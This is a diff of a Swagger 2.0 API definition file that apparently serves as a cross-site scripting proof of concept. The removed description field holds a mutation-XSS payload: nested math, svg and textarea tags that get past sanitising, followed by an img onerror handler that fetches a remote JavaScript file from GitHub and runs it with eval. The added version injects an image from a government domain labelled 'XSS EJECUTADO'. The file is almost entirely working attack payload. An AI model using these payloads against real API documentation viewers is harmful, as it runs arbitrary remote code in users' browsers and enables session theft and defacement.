@@ -1,6 +1,6 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  title: XSS Test PoC
-  description: <math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><textarea><a title='</textarea><img src onerror=fetch(`https://raw.githubusercontent.com/staretz/test-swg/refs/heads/main/payload.js`).then(function(res){res.text().then(function(data){eval(data)})})>'></textarea></h1>">"</textarea></desc></textarea></mtext></mtext></svg></mglyph></option></mtext></math>
-  version: 1.0.0
+  title: "Image Test PoC"
+  description: '<img src="https://certifica.buengobierno.gob.mx/html/images/BG_logo.png/?text=XSS+EJECUTADO" style="border:3px solid red;display:block;margin:10px;">'
+  version: "1.0.0"
 paths: {}
